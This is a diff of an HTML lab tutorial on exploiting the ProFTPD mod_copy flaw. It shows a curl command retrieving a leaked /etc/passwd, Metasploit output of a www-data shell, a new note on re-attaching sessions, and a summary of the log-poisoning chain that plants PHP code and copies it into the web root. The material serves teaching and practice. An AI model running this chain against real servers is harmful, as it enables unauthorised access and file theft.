@@ -482,7 +482,7 @@ SITE CPTO /var/www/html/leak
 
 <h3>6.2 Terminal B · fetch the file over HTTP</h3>
 
-<pre><code class="language-bash">curl http://$TARGET/leak
+<pre><code class="language-bash">curl http://target.example.com/leak
 # root:x:0:0:root:/root:/bin/bash
 # daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 # bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -594,6 +594,14 @@ SITEPATH =&gt; /var/www/html
 <span class="msf-line" data-explain="You are now in the same www-data shell you opened by hand in step 6.3.">id</span>
 uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
   <div class="msf-explain" id="msf-explain">Hover any highlighted line for an explanation.</div>
+</div>
+
+<div class="callout note">
+  <span class="label">if you see <code>session closed</code></span>
+  <p>If the shell drops (you typed <code>exit</code>, or the connection was interrupted) you'll land back at the <code>msf6</code> prompt with the shell gone. List the sessions Metasploit is still tracking, then re-attach to the one you want:</p>
+  <pre class="term-snippet"><span class="term-comment">msf6 exploit(...) &gt;</span> <span class="term-cmd">sessions</span>     <span class="term-comment"># list open sessions</span>
+<span class="term-comment">msf6 exploit(...) &gt;</span> <span class="term-cmd">sessions 1</span>   <span class="term-comment"># re-select session 1</span></pre>
+  <p>If <code>sessions</code> lists nothing, every shell is closed — just <code>run</code> the exploit again to open a fresh one.</p>
 </div>
 
 <p>That's it. The framework opened the FTP connection, planted PHP code in the daemon's log via the <code>USER</code> argument, ran <code>SITE CPFR</code>/<code>CPTO</code> to copy the log into the web root, and then fetched the planted file over HTTP — exactly the same chain you ran by hand in §6.3, wrapped in a session manager, a payload selector, and a logging system.</p>
